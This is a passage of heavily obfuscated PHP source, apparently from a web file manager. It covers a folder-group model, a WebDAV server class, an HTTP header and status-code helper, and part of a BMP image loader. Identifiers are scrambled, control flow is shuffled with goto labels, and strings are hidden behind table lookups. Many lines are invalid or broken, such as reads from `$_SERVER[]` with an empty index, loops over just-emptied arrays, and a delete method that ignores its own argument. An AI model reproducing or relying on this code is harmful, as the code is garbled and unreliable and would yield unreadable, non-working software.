Model($F٧ė[2141])->where($bЧ)->select(); $cш = array_to_keyvalue_group($cш, $F٧ė[2068]); foreach ($cш as &$cĕ钫) { $cĕ钫 = array_to_keyvalue($cĕ钫, $F٧ė[89], $F٧ė[355]); } foreach ($cҍ as &$dح) { $dح[$F٧ė[413]] = array(); if (isset($cш[$dح[$F٧ė[2068]]])) { $dح[$F٧ė[413]] = $cш[$dح[$F٧ė[2068]]]; } } } protected function parentLevelArray($eɬ) { $D =& $_SERVER[]; $eɬ = explode($D[47], trim($eɬ, $D[47])); $eɬ = array_remove_value($eɬ, $D[464]); return $eɬ; } private function _listAppendParent(&$Cٍ) { goto bʟ; c򐔸: $f = array(); foreach ($f as $d => $c˩) { if (!$c˩) { $f[] = $d; } } if ($f) { $e = array($E[2140] => array($E[380], $f)); $D = $this->field($E[2153])->where($e)->select(); $Aą = array_to_keyvalue($D, $E[2068], $E[28]); $f = array_merge_index($f, $Aą); } goto Cݑ; Cݑ: foreach ($Cٍ as &$E) { $D = $this->parentLevelArray($E[$E[455]]); $e = $E[33]; foreach ($D as $a͗) { $e .= $f[$a͗] . $E[8]; } if ($D) { $e .= $E[$E[28]]; } $E[$E[459]] = str_replace($E[463], $E[8], $e); } goto C; bʟ: $E =& $_SERVER[]; $f = array(); foreach ($Cٍ as &$E) { $f[$E[$E[2068]]] = $E[$E[28]]; $D = $this->parentLevelArray($E[$E[455]]); foreach ($D as $a͗) { if (!isset($f[$a͗])) { $f[$a͗] = 0; } } } goto c򐔸; C: } private function _listAppendSourceRoot(&$C, $F뜃) { goto A; Dթ: foreach ($C as &$EϮ) { $EϮ[$D[387]] = $F[$EϮ[$D[2068]]] ? $F[$EϮ[$D[2068]]] : array(); } goto dŪ; A: $D =& $_SERVER[]; $eֆ = array($D[367] => SourceModel::TYPE_GROUP, $D[457] => 0, $D[452] => array($D[7], $F뜃)); $aˊ̯ = $D[2154]; goto eʸ; eʸ: $F = Model($D[738])->order($D[2155])->field($aˊ̯)->where($eֆ)->select(); $F = array_to_keyvalue($F, $D[452]); $F = array_remove_key($F, $D[452]); goto Dթ; dŪ: } protected function resetParentLevel() { $E =& $_SERVER[]; $e = $E[2068]; $Eҫʽ = $this->select(); $Eҫʽ = array_to_keyvalue($Eҫʽ, $e); foreach ($Eҫʽ as $a䋂ª) { goto bչ; bչ: $b趑 = $a䋂ª; $B؄Ƭ = array(); while ($b趑[$E[457]] != 0) { $B؄Ƭ[] = $b趑[$E[457]]; $b趑 = $Eҫʽ[$b趑[$E[457]]]; } goto bҍ; bҍ: $B؄Ƭ[] = 0; $B؄Ƭ = $E[47] . implode($E[47], array_reverse($B؄Ƭ)) . $E[47]; $this->setNamePinyin($a䋂ª[$e], $a䋂ª[$E[28]]); goto e; e: $this->where(array($e => $a䋂ª[$e]))->save(array($E[521] => $B؄Ƭ)); goto aʵ; aʵ: } return $Eҫʽ; } public function groupNameAuto($D܎, $Eʋ) { $B⿟ =& $_SERVER[]; $B氼 = $this->where(array($B⿟[364] => $D܎))->getField($B⿟[28], !0); if (!$B氼 || !in_array($Eʋ, $B氼)) { return $Eʋ; } for ($aԾ = 1; $aԾ <= count($B氼) + 1; $aԾ++) { $c = $Eʋ . "\50{$aԾ}\51"; if (!in_array($c, $B氼)) { return $c; } } } } goto f׍; c㪬: class HttpDavServer { public function __construct($e׌, $Dݒ؃) { $this->root = $e׌; $this->initPath($Dݒ؃); $this->start(); } public function initPath($a) { $D =& $_SERVER[]; $cɥϫ = rtrim($_SERVER[$D[1357]], $D[8]) . $D[8]; $this->urlBase = substr($cɥϫ, 0, strpos($cɥϫ, $a) + 1); $this->urlBase = rtrim($this->urlBase, $D[8]) . $a; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $bӺ =& $_SERVER[]; $FҔ = HttpAuth::get(); if ($FҔ[$bӺ[531]] == $bӺ[1748] && $FҔ[$bӺ[883]] == $bӺ[1749]) { return !0; } HttpAuth::error(); } public function start() { goto a; EƔ: if (!method_exists($this, $D)) { pr($D . $CŴ̌[1750]); die; } $Cꥌ = array($CŴ̌[1751], $CŴ̌[1752]); if (!in_array($D, $Cꥌ) && !$this->pathExists($this->path)) { $BǓ = array($CŴ̌[1019] => 404); } else { $BǓ = $this->{$D}(); } goto dꖬ; dꖬ: if (!$BǓ) { return; } self::response($BǓ); goto E; a: $CŴ̌ =& $_SERVER[]; $this->checkUser(); $D = $CŴ̌[142] . HttpHeader::method(); goto EƔ; E: } public function pathGet($fϟ = false) { $B =& $_SERVER[]; $B = $fϟ ? $_SERVER[$B[1753]] : $_SERVER[$B[1357]]; $B = KodIO::clear(rawurldecode($B)); if (!strstr($B, KodIO::clear($this->urlBase))) { return !1; } return substr($B, strpos($B, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($f) { return file_exists($f); } public function pathMkdir($C֣) { return mkdir($C֣, 511, !0); } public function pathInfo($Fð) { return path_info($Fð); } public function pathList($d) { return path_list($d); } public function pathOut($bӊˏ) { echo file_get_contents($bӊˏ); } public function pathPut($eۚ, $F = '') { if (!$F) { return file_put_contents($eۚ, $_SERVER[][33]); } return move_path($F, $eۚ); } public function pathRemove($D٤) { if (is_file($D٤)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($E, $B݃) { return move_path($E, $B݃); } public function pathCopy($cݒ, $d⾌ٴ) { return copy_dir($cݒ, $d⾌ٴ); } public function parsePath($d鷬) { return $d鷬; } public function parseItem($cֳ, $a鄡) { goto Fî; Dͅܕ: $cٶк = array($D[1754] => KodIO::clear($this->urlBase . $B׷), $D[106] => @gmdate($D[1755], $cֳ[$D[106]]), $D[183] => @gmdate($D[1756], $cֳ[$D[183]]), $D[77] => $cֳ[$D[77]] ? $cֳ[$D[77]] : 0); return $cٶк; goto a; Fî: $D =& $_SERVER[]; $B׷ = $this->pathGet() . $D[8] . $cֳ[$D[28]]; $B׷ = $D[8] . str_replace($D[168], $D[8], rawurlencode($B׷)); goto C; C: if ($a鄡) { $B׷ = $D[8] . str_replace($D[168], $D[8], rawurlencode($this->pathGet())); } if (!trim($cֳ[$D[106]])) { $cֳ[$D[106]] = time(); } if (!trim($cֳ[$D[183]])) { $cֳ[$D[183]] = time(); } goto Dͅܕ; a: } public function parseItemXml($C㞛, $cܗ) { $Dȹ֏ =& $_SERVER[]; $fʊ = $this->parseItem($C㞛, $cܗ); if ($C㞛[$Dȹ֏[29]] == $Dȹ֏[76]) { $f = $Dȹ֏[1757]; $f .= $Dȹ֏[1758]; } else { $aݟ = $C㞛[$Dȹ֏[156]] ? $C㞛[$Dȹ֏[156]] : get_path_ext($C㞛[$Dȹ֏[28]]); $E̓ = get_file_mime($aݟ); $f = $Dȹ֏[1759]; $f .= "\74\x44\x3a\147\x65\164\143\x6f\x6e\164\145\156\x74\164\171\x70\x65\76{$E̓}\74\57\104\x3a\147\145\164\x63\x6f\156\164\145\x6e\164\164\171\160\x65\x3e"; } return "\12\11\11\74\x44\x3a\x72\x65\x73\x70\x6f\x6e\x73\145\x3e\12\x9\x9\x9\x3c\104\72\x68\162\x65\146\76{$fʊ[$Dȹ֏[1754]]}\74\x2f\104\72\150\x72\x65\x66\x3e\12\x9\x9\x9\x3c\104\x3a\x70\x72\x6f\160\x73\x74\141\164\76\xa\11\x9\11\11\74\x44\72\x70\x72\x6f\x70\76\12\x9\x9\11\11\x9\x3c\x44\72\147\145\164\154\x61\163\x74\155\157\144\x69\146\151\x65\x64\x3e{$fʊ[$Dȹ֏[106]]}\x3c\57\104\x3a\147\x65\164\154\x61\163\164\x6d\157\x64\x69\146\151\145\144\76\12\x9\x9\11\11\11\74\x44\x3a\x63\x72\145\141\164\151\157\156\144\141\x74\x65\x3e{$fʊ[$Dȹ֏[183]]}\x3c\x2f\104\72\x63\x72\x65\141\x74\x69\157\156\144\x61\164\x65\x3e\12\x9\x9\11\x9\11\x3c\x44\72\147\145\164\x63\x6f\x6e\x74\145\156\164\154\145\x6e\x67\x74\150\76{$fʊ[$Dȹ֏[77]]}\74\x2f\104\x3a\x67\x65\x74\x63\x6f\156\164\x65\x6e\x74\x6c\x65\x6e\147\x74\150\76\12\11\11\x9\x9\x9{$f}\12\x9\11\x9\x9\74\57\x44\72\x70\162\157\160\76\12\x9\x9\11\11\x3c\x44\x3a\x73\x74\x61\164\165\x73\76\110\x54\x54\x50\x2f\61\56\x31\40\x32\60\60\40\x4f\113\74\x2f\104\72\x73\x74\141\x74\x75\163\x3e\xa\11\x9\x9\74\x2f\x44\x3a\160\x72\157\160\x73\164\x61\x74\x3e\12\x9\11\74\x2f\104\72\162\145\163\160\x6f\x6e\x73\x65\x3e"; } public function pathListMerge($aƬ) { goto C; a: $d = array(); foreach ($aƬ as $d => $Cݵ) { if (!in_array($d, $a﹞) || !is_array($Cݵ)) { continue; } $d = array_merge($d, $Cݵ); } foreach ($d as &$DŚ) { $DŚ[$Bܿ[28]] = str_replace($Bܿ[8], $Bܿ[1359], $DŚ[$Bܿ[28]]); } goto B䴘; B䴘: return $d; goto Eߗ; C: $Bܿ =& $_SERVER[]; if (!$aƬ) { return $aƬ; } $a﹞ = array($Bܿ[73], $Bܿ[74], $Bܿ[1760]); goto a; Eߗ: } public function httpPROPFIND() { goto a׆􂮐; a׆􂮐: $eŎ =& $_SERVER[]; $Cګُ = $this->pathList($this->path); $AҒ֔ = $this->pathListMerge($Cګُ); goto a؃; D: if ($aǌ藝) { $AҒ֔ = array($E); } else { $E[$eŎ[28]] = $eŎ[33]; $AҒ֔ = array_merge(array($E), $AҒ֔); } $F = $eŎ[33]; foreach ($AҒ֔ as $E) { $F .= $this->parseItemXml($E, $aǌ藝); } goto cʊ; a؃: $E = $Cګُ[$eŎ[1761]]; if (!is_array($AҒ֔) || $E[$eŎ[1762]] === !1) { return array($eŎ[1763] => 404, $eŎ[1764] => $eŎ[1765]); } $aǌ藝 = $E[$eŎ[29]] == $eŎ[163] || HttpHeader::get($eŎ[1740]) == $eŎ[464]; goto D; cʊ: return array($eŎ[1763] => 207, $eŎ[1764] => "\x3c\104\x3a\155\165\154\164\151\x73\164\x61\164\165\x73\40\x78\x6d\x6c\156\163\72\x44\x3d\x22\104\x41\126\x3a\42\x3e\12{$F}\12\74\x2f\104\x3a\155\x75\x6c\x74\x69\x73\164\x61\164\x75\x73\x3e"); goto fޏԜ; fޏԜ: } public function httpHEAD() { $eɏ =& $_SERVER[]; $aܯ׆ = $this->pathInfo($this->path); if (!$aܯ׆ || $aܯ׆[$eɏ[29]] == $eɏ[76]) { return array($eɏ[1019] => 200, $eɏ[1186] => array($eɏ[1766])); } return array($eɏ[1019] => 200, $eɏ[1186] => array($eɏ[1767], $eɏ[135], $eɏ[1768] . $aܯ׆[$eɏ[77]], $eɏ[1769] . get_file_mime($aܯ׆[$eɏ[156]]), $eɏ[131] . gmdate($eɏ[1755], $aܯ׆[$eɏ[1233]]) . $eɏ[1770], $eɏ[1771])); } public function httpOPTIONS() { $f =& $_SERVER[]; return array($f[1019] => 200, $f[1186] => array($f[1772], $f[1773], $f[1774], $f[1242])); } public function httpPROPPATCH() { $Bɾ =& $_SERVER[]; $e։ = $Bɾ[1775] . $_SERVER[$Bɾ[1357]] . $Bɾ[1776]; return array($Bɾ[1763] => 207, $Bɾ[1764] => "\x3c\104\72\x6d\x75\154\164\151\163\x74\141\x74\x75\163\40\170\155\x6c\x6e\x73\72\104\75\42\x44\x41\x56\x3a\x22\x3e\12{$e։}\12\x3c\x2f\104\x3a\x6d\165\154\x74\151\163\x74\141\164\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $a =& $_SERVER[]; $E򢃉 = $this->uploadFile(); if ($E򢃉) { $cʱƉ = 204; } else { $E򢃉 = $a[33]; $cʱƉ = 201; } $aϐ = $this->pathPut($this->path, $E򢃉); if ($aϐ == !1) { $cʱƉ = 404; } return array($a[1763] => $cʱƉ); } private function uploadFile() { goto D; D: $d =& $_SERVER[]; @mk_dir(TEMP_FILES); $c = TEMP_FILES . $d[1777] . rand_string(32); goto c㙗; fۧˇ: while (!feof($EӨ)) { fwrite($cޭ, fread($EӨ, 1024 * 200)); } fclose($EӨ); fclose($cޭ); goto f; c㙗: $cޭ = @fopen($c, $d[1486]); $EӨ = @fopen($d[1778], $d[1485]); if (!$EӨ || !$cޭ) { @unlink($c); return !1; } goto fۧˇ; f: if (@filesize($c) > 0) { return $c; } @unlink($c); return !1; goto c䢼; c䢼: } public function httpMKCOL() { $Bڥ =& $_SERVER[]; if ($this->pathExists($this->path)) { return array($Bڥ[1019] => 409); } $DǆĤ = $this->pathMkdir($this->path); return array($Bڥ[1019] => $DǆĤ ? 201 : 403); } public function httpMOVE() { $Aݠ =& $_SERVER[]; $dك = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$Aݠ[1779]])) { $Dކ[$Aݠ[1780]] = $_SERVER[$Aݠ[1779]] == $Aݠ[1781]; } $a = $this->pathMove($this->path, $dك); return array($Aݠ[1019] => $a ? 201 : 404); } public function httpCOPY() { $AÔǐ = $this->parsePath($this->pathGet(!0)); $aĶذ = $this->pathCopy($this->path, $AÔǐ); return array($_SERVER[][1019] => $aĶذ ? 201 : 404); } public function httpDELETE() { $Bѵ = $this->pathRemove($this->path); return array($_SERVER[][1019] => $Bѵ ? 200 : 503); } public function httpLOCK() { $Dõ =& $_SERVER[]; $c = md5($this->path); $D燋 = $Dõ[1782] . $this->xmlGet($Dõ[1783]) . $Dõ[1784] . $c . $Dõ[1785]; return array($Dõ[1019] => 200, $Dõ[1186] => array($Dõ[1786] . $c, $Dõ[1787]), $Dõ[1788] => $D燋); } public function httpUNLOCK() { return array($_SERVER[][1019] => 204); } public function xmlGet($f΃) { goto fא; fא: $E =& $_SERVER[]; static $F = false; if (!$F) { $D֍ = file_get_contents($E[1789]); $F = new DOMDocument(); $F->loadXML($D֍); } goto FѢʦ; Cȑ: return $E[33]; goto c҇; FѢʦ: $Fև = array_shift(explode($E[8], $f΃)); $eߪ = $F->getElementsByTagNameNS($E[1790], $Fև); if ($eߪ) { return $eߪ[0]->nodeValue; } goto Cȑ; c҇: } public static function response($c묇) { goto C؆; C؆: $C =& $_SERVER[]; $Dű = is_array($c묇[$C[1186]]) ? $c묇[$C[1186]] : array(); $Dű[] = HttpHeader::code($c묇[$C[1019]]); goto cɋ; cɋ: $Dű[] = $C[1730]; $Dű[] = $C[1731]; foreach ($Dű as $Cǰޑ) { header($Cǰޑ); } goto A; A: if (is_string($c묇[$C[1788]])) { header($C[1791]); $f̎ = $C[1792] . $C[213] . $c묇[$C[1788]]; echo $f̎; } goto eĻ; eĻ: } } class HttpHeader { public static $_headers = array("\110\x6f\163\164" => "\x48\x54\x54\x50\x5f\x48\x4f\123\x54", "\125\163\x65\x72\x2d\101\x67\145\156\x74" => "\110\124\124\120\x5f\x55\x53\x45\122\137\x41\x47\x45\x4e\124", "\103\x6f\x6e\164\x65\x6e\164\x2d\x54\x79\160\145" => "\x48\x54\124\x50\137\x43\x4f\x4e\124\x45\x4e\x54\x5f\x54\x59\x50\x45", "\103\x6f\156\164\145\x6e\164\x2d\114\145\x6e\147\x74\150" => "\110\x54\124\120\137\x43\x4f\116\124\105\x4e\x54\x5f\114\105\116\x47\124\x48", "\104\x65\x70\164\150" => "\110\124\x54\120\137\x44\105\x50\x54\x48", "\x45\170\160\x65\143\164" => "\110\x54\x54\120\x5f\x45\130\120\105\x43\124", "\111\x66\55\116\x6f\156\145\55\x4d\x61\164\x63\x68" => "\110\x54\124\120\x5f\111\x46\x5f\x4e\x4f\116\105\x5f\x4d\x41\124\103\110", "\x49\x66\55\115\141\164\x63\x68" => "\110\124\x54\x50\137\x49\x46\x5f\x4d\x41\x54\103\110", "\111\x66\55\x52\141\x6e\147\145" => "\x48\124\x54\120\x5f\111\x46\137\x52\101\x4e\107\x45", "\114\141\x73\x74\55\x4d\x6f\144\x69\x66\151\x65\x64" => "\110\x54\x54\x50\137\114\101\123\124\137\115\x4f\104\111\x46\x49\x45\104", "\111\x66\x2d\115\157\x64\x69\x66\x69\145\144\55\123\151\x6e\143\145" => "\110\x54\x54\120\x5f\x49\106\x5f\115\x4f\x44\x49\106\x49\x45\104\x5f\x53\x49\x4e\x43\x45", "\111\146\55\125\156\155\x6f\x64\x69\x66\151\x65\x64\x2d\x53\151\x6e\x63\145" => "\x48\124\124\x50\x5f\x49\106\137\125\116\x4d\x4f\104\111\106\x49\105\x44\x5f\x53\x49\116\x43\105", "\x52\141\156\x67\x65" => "\110\124\124\x50\x5f\122\x41\116\107\105", "\x54\151\155\x65\x6f\165\164" => "\110\124\x54\120\x5f\124\x49\x4d\x45\x4f\x55\x54", "\111\146" => "\110\124\x54\x50\x5f\x49\x46", "\x4c\157\143\153\55\x54\x6f\153\145\156" => "\x48\124\124\120\x5f\114\117\x43\x4b\137\124\117\x4b\x45\x4e", "\x4f\166\145\x72\167\x72\151\x74\x65" => "\x48\x54\x54\120\137\x4f\x56\x45\122\127\x52\111\x54\105", "\x44\145\163\164\151\x6e\x61\164\x69\157\x6e" => "\110\x54\124\x50\x5f\x44\x45\123\124\x49\x4e\101\x54\x49\x4f\116", "\122\x65\x71\x75\x65\163\164\x2d\x49\144" => "\122\105\121\x55\x45\123\x54\137\x49\104", "\x52\145\x71\165\x65\x73\x74\55\102\x6f\144\171\x2d\106\x69\154\x65" => "\x52\105\x51\x55\105\x53\124\x5f\102\117\x44\131\x5f\x46\x49\x4c\x45", "\122\x65\x64\x69\162\145\143\x74\55\123\x74\x61\x74\x75\163" => "\x52\x45\104\111\x52\105\x43\x54\x5f\x53\124\x41\x54\x55\123"); public static function init() { static $CĜё = false; if ($CĜё) { return; } foreach ($_SERVER as $A => $c) { $A = strtoupper($A); if (!array_key_exists($A, $_SERVER)) { continue; } $_SERVER[$A] = $c; } foreach (self::$_headers as $A => $Aݒώ) { if (!array_key_exists($A, $_SERVER)) { continue; } $_SERVER[$A] = $_SERVER[$Aݒώ]; $_SERVER[strtoupper($A)] = $_SERVER[$Aݒώ]; } } public static function get($Eʴ) { self::init(); return $_SERVER[$Eʴ] ? $_SERVER[$Eʴ] : $_SERVER[$_SERVER[][1793] . strtoupper($Eʴ)]; } public static function method() { return strtoupper(self::get($_SERVER[][150])); } public static function length() { $E =& $_SERVER[]; $aȈû = self::get($E[1794]); if (!$aȈû) { $aȈû = self::get($E[1125]); } return $aȈû; } public static function range() { $fō =& $_SERVER[]; $FŪ = self::get($fō[194]); if (!$FŪ) { return !1; } if (!preg_match($fō[1795], $FŪ, $Aܽ)) { return !1; } if ($Aܽ[1] === $fō[33] && $Aܽ[2] === $fō[33]) { return !1; } return array($Aܽ[1] !== $fō[33] ? $Aܽ[1] : null, $Aܽ[2] !== $fō[33] ? $Aܽ[2] : null); } public static $statusCode = array("\61\60\60" => "\103\x6f\156\x74\x69\x6e\x75\x65", "\61\x30\61" => "\x53\167\151\x74\143\150\x69\x6e\147\40\120\162\157\x74\x6f\x63\x6f\x6c", "\61\60\x32" => "\120\162\157\x63\145\x73\x73\x69\x6e\147", "\61\60\63" => "\105\141\162\x6c\171\40\110\x69\156\164\163", "\62\60\x30" => "\117\x4b", "\x32\x30\61" => "\103\x72\145\141\x74\145\144", "\x32\x30\62" => "\101\143\143\x65\160\164\x65\144", "\x32\x30\x33" => "\116\x6f\x6e\x2d\101\165\164\x68\x6f\x72\151\x74\141\x74\x69\166\x65\40\x49\156\x66\157\162\x6d\141\164\151\157\x6e", "\x32\60\x34" => "\x4e\x6f\x20\103\157\156\164\145\x6e\164", "\x32\60\65" => "\x52\145\x73\145\164\x20\103\x6f\156\164\145\156\x74", "\62\60\66" => "\120\141\x72\x74\151\x61\154\40\103\x6f\x6e\x74\145\x6e\164", "\x32\x30\x37" => "\x4d\165\154\x74\x69\x2d\123\x74\141\164\x75\163", "\63\60\x30" => "\x4d\165\154\164\x69\160\154\145\40\103\150\x6f\151\143\145\163", "\63\60\x31" => "\115\157\x76\145\144\x20\120\145\x72\155\x61\156\145\156\x74\154\171", "\63\x30\62" => "\x46\157\165\x6e\x64", "\x33\60\63" => "\x53\145\x65\x20\117\x74\x68\x65\162", "\63\x30\64" => "\x4e\157\164\x20\115\157\144\x69\x66\151\x65\144", "\63\x30\65" => "\x55\x73\145\x20\120\x72\x6f\170\171", "\x33\x30\x37" => "\124\x65\x6d\160\157\162\x61\x72\x79\40\x52\x65\144\x69\x72\x65\143\164", "\x33\60\x38" => "\120\x65\x72\x6d\x61\x6e\145\156\164\40\x52\145\144\151\162\x65\x63\164", "\x34\x30\x30" => "\102\141\x64\40\122\145\161\165\145\x73\x74", "\x34\60\x31" => "\x55\x6e\x61\x75\x74\150\157\162\x69\x7a\145\144", "\x34\x30\62" => "\x50\x61\171\x6d\x65\x6e\x74\40\122\x65\161\165\x69\x72\x65\x64", "\64\x30\x33" => "\106\157\x72\x62\151\x64\x64\x65\156", "\64\x30\x34" => "\x4e\157\164\40\106\x6f\165\156\x64", "\x34\60\65" => "\x4d\145\164\x68\157\144\40\116\x6f\x74\40\101\154\154\157\167\145\x64", "\64\x30\66" => "\116\x6f\164\x20\101\143\143\x65\x70\164\x61\x62\154\145", "\64\60\x37" => "\x50\x72\x6f\x78\171\x20\x41\165\164\150\145\x6e\x74\x69\143\x61\x74\x69\x6f\x6e\40\x52\145\x71\165\x69\162\145\144", "\64\60\x38" => "\122\x65\x71\165\x65\163\164\x20\x54\x69\155\x65\x6f\x75\164", "\64\x30\71" => "\x43\x6f\156\x66\x6c\151\143\164", "\x34\x31\x30" => "\107\157\156\x65", "\64\61\x31" => "\x4c\x65\156\x67\x74\x68\x20\122\145\x71\x75\x69\x72\145\x64", "\x34\61\x32" => "\x50\x72\145\143\157\x6e\x64\151\164\151\x6f\x6e\40\x46\141\151\154\x65\x64", "\64\x31\x33" => "\122\145\161\165\x65\163\164\x20\x45\x6e\164\151\x74\171\x20\124\x6f\157\40\x4c\x61\x72\x67\145", "\64\x31\64" => "\122\145\161\x75\145\163\x74\x20\x55\x52\x49\x20\124\157\x6f\40\x4c\x61\x72\x67\x65", "\64\x31\x35" => "\125\156\163\x75\160\x70\x6f\x72\x74\145\x64\x20\x4d\145\x64\x69\141\x20\x54\171\x70\x65", "\64\x31\x36" => "\122\x65\161\x75\145\x73\164\x65\144\x20\x52\141\x6e\147\145\40\x4e\157\164\40\123\x61\164\151\x73\x66\x69\x61\142\x6c\145", "\x34\61\67" => "\105\170\160\145\143\x74\x61\164\x69\157\x6e\x20\x46\x61\151\154\x65\144", "\x34\x32\62" => "\x55\156\160\162\157\143\145\x73\163\141\142\x6c\x65\40\x45\156\x74\151\164\171", "\x34\x32\63" => "\x4c\157\x63\x6b\145\144", "\x34\62\64" => "\x46\141\151\154\145\x64\40\x44\145\x70\145\156\x64\x65\156\143\x79", "\64\62\x35" => "\125\x6e\157\162\x64\145\162\x65\144\40\x43\157\x6c\154\x65\x63\164\151\x6f\156", "\x34\62\66" => "\x55\160\147\162\x61\x64\145\x20\122\145\161\x75\x69\x72\x65\x64", "\64\x32\70" => "\x50\162\x65\143\x6f\x6e\144\151\x74\x69\x6f\x6e\40\122\x65\161\x75\151\x72\145\144", "\x34\x32\x39" => "\x54\x6f\x6f\x20\115\141\156\171\x20\x52\145\x71\165\145\163\x74\163", "\64\63\x31" => "\x52\145\161\x75\x65\163\164\40\x48\x65\x61\x64\x65\162\x20\x46\151\145\154\x64\x73\40\124\x6f\x6f\40\114\141\x72\x67\x65", "\x34\64\x34" => "\x4e\157\40\x52\145\163\x70\157\x6e\163\145", "\64\x35\60" => "\102\154\x6f\x63\x6b\x65\x64\x20\x62\x79\40\127\x69\156\x64\157\167\163\40\120\x61\x72\x65\x6e\x74\141\154\40\x43\x6f\x6e\164\162\157\154\x73", "\64\x35\x31" => "\x55\156\141\x76\x61\151\x6c\x61\x62\x6c\145\40\106\x6f\162\x20\x4c\x65\147\x61\x6c\x20\122\x65\x61\163\157\156\x73", "\x34\x39\64" => "\122\x65\161\x75\x65\x73\164\x20\x48\x65\x61\144\145\162\40\x54\157\x6f\x20\x4c\141\162\x67\x65", "\x35\60\x30" => "\111\x6e\164\145\x72\x6e\141\154\40\123\x65\162\166\145\162\x20\x45\162\x72\x6f\162", "\x35\x30\61" => "\116\x6f\x74\40\x49\155\160\154\145\155\x65\x6e\164\x65\x64", "\65\x30\x32" => "\102\141\x64\40\107\x61\x74\145\x77\141\x79", "\65\60\x33" => "\x53\145\x72\x76\x69\x63\x65\40\125\156\x61\x76\141\x69\154\x61\142\x6c\145", "\65\60\64" => "\x47\141\x74\x65\x77\141\171\40\x54\x69\x6d\x65\157\165\x74", "\65\60\65" => "\x48\124\x54\120\x20\x56\x65\162\x73\x69\x6f\x6e\x20\x6e\157\x74\40\x73\165\160\x70\157\162\164\145\x64", "\65\60\67" => "\x49\156\163\x75\146\146\x69\x63\x69\145\156\x74\40\123\x74\157\x72\141\x67\145"); public static function code($AӲ螸) { $Aŉå =& $_SERVER[]; $AӲ螸 = $AӲ螸 . $Aŉå[33]; $Aﰒ = self::$statusCode[$AӲ螸]; $Aﰒ = $Aﰒ ? "\110\x54\x54\120\57\x31\x2e\x31\x20{$AӲ螸}\40" . $Aﰒ : $Aŉå[33]; return $Aﰒ; } } class ImageGdBMP { public static function load($F񎇳) { $c͙ǐ = fopen($F񎇳, $_SERVER[][1485]); if ($c͙ǐ === !1) { return !1; } $F = self::loadFromStream($c͙ǐ); fclose($c͙ǐ); return $F; } public static function loadFromStream($aք) { $dĩ =& $_SERVER[]; $A搖 = fread($aք, 14); if ($A搖 === !1) { return !1; } if ($A搖[0] != $dĩ[1796] || $A搖[1] != $dĩ[1797]) { return !1; } $fڌۉ = unpack($dĩ[1798] . $dĩ[1799] . $dĩ[1800] . $dĩ[1801] . $dĩ[1802], $A搖); return self::loadFromStreamAndFileHeader($aք, $fڌۉ); } public static function loadFromStreamAndFileHeader($Dķ, array $a) { goto Cѩ; a: if ($f === !1) { return !1; } list(, $fͯ) = unpack($e[1803], $f); if ($fͯ == 12) { goto f܆ܬĵ; f܆ܬĵ: $f = fread($Dķ, $fͯ - 4); if ($f === !1) { return !1; } extract(unpack($e[1804] . $e[1805] . $e[1806] . $e[1807], $f)); goto f; f: $e = $E = $BÅ = $A⾈ѵ = 0; $Dђ = 16711680; $E⹹ = 65280; goto A; A: $eۺ塼 = 255; goto D±; D±: } else { if (124 < $fͯ || $fͯ < 40) { return !1; } else { goto d̅; eୌ: if ($Aԥ & 2147483648) { $Aԥ = -(~$Aԥ & 4294967295) - 1; } if ($a[$e[516]] != 0) { $c = $D == 1 || $D == 4 || $D == 8 ? ($e ? $e : pow(2, $D)) << 2 : 0; $c̫ = $bÃ ? $bÃ : ($Ḅ * $D + 31 >> 3 & ~3) * abs($aѪ); $fݫ = $a[$e[516]] - $c̫ - $c - 14; if ($fͯ < $fݫ && 40 <= $fͯ && $fͯ <= 124) { $fͯ = $fݫ; } } if ($fͯ - 40 > 0) { $f = fread($Dķ, $fͯ - 40); if ($f === !1) { return !1; } extract(unpack($e[1817] . $e[1818] . $e[1819] . $e[1820], $f . str_repeat($e[1821], 120))); } else { $BÅ = $Dђ = $E⹹ = $eۺ塼 = 0; } goto B; B: if ($Ḅ & 2147483648) { $Ḅ = -(~$Ḅ & 4294967295) - 1; } if ($aѪ & 2147483648) { $aѪ = -(~$aѪ & 4294967295) - 1; } if ($b𲗸 & 2147483648) { $b𲗸 = -(~$b𲗸 & 4294967295) - 1; } goto eୌ; d̅: $f = fread($Dķ, 36); if ($f === !1) { return !1; } extract(unpack($e[1808] . $e[1809] . $e[1806] . $e[1810] . $e[1811] . $e[1812] . $e[1813] . $e[1814] . $e[1815] . $e[1816], $f)); goto B; B: if (($D == 16 || $D == 24 || $D == 32) && $A⾈ѵ == 0 && $Dђ == 0 && $E⹹ == 0 && $eۺ塼 == 0) { switch ($D) { case 16: $Dђ = 31744; $E⹹ = 992; $eۺ塼 = 31; break; case 24: case 32: $Dђ = 16711680; $E⹹ = 65280; $eۺ塼 = 255; break; } } goto cū; cū: } } goto B߄; B: if ($D == 1 || $D == 4 || $D == 8) { goto Aћ; cς: $a˰ɾ = array(); for ($C̯ģ = 0; $C̯ģ < $Cԩޕ; ++$C̯ģ) { $f = fread($Dķ, $Eݼۆ); if ($f === !1) { imagedestroy($A֠); return !1; } extract(unpack($e[1822], $f . $e[1821])); $a˰ɾ[] = imagecolorallocate($A֠, $Cᕑ, $Aٶ, $eȲ焍); } $fճ = 8 - $D; goto Dك; Aћ: $A֠ = imagecreate($Ḅ, $d); $Eݼۆ = $fͯ == 12 ? 3 : 4; $Cԩޕ = $e ? $e : pow(2, $D); goto cς; Dك: $C󴛰 = (1 << $D) - 1 << $fճ; if ($A⾈ѵ == 1 || $A⾈ѵ == 2) { $Ĉ = 0; $bѶ = $D >> 2 & 1; for (;;) { if ($Ĉ < -1 || $Ĉ > $Ḅ || $aк < -1 || $aк > $aѪ) { imagedestroy($A֠); return !1; } $f = fread($Dķ, 1); if ($f === !1) { imagedestroy($A֠); return !1; } switch ($f) { case $e[1821]: $f = fread($Dķ, 1); if ($f === !1) { imagedestroy($A֠); return !1; } switch ($f) { case $e[1821]: $aк += $a׶; $Ĉ = 0; break; case $e[1823]: $aк = 0; $Ĉ = 0; break 3; case $e[1824]: $f = fread($Dķ, 2); if ($f === !1) { imagedestroy($A֠); return !1; } list(, $Eêۜ, $Cº) = unpack($e[1825], $f); $Ĉ += $Eêۜ; $aк += $Cº * $a׶; break; default: list(, $cڒ䊳ډ) = unpack($e[1826], $f); $a͐ = ($cڒ䊳ډ >> $bѶ) + ($cڒ䊳ډ & $bѶ); $f = fread($Dķ, $a͐ + 1 & ~1); if ($f === !1) { 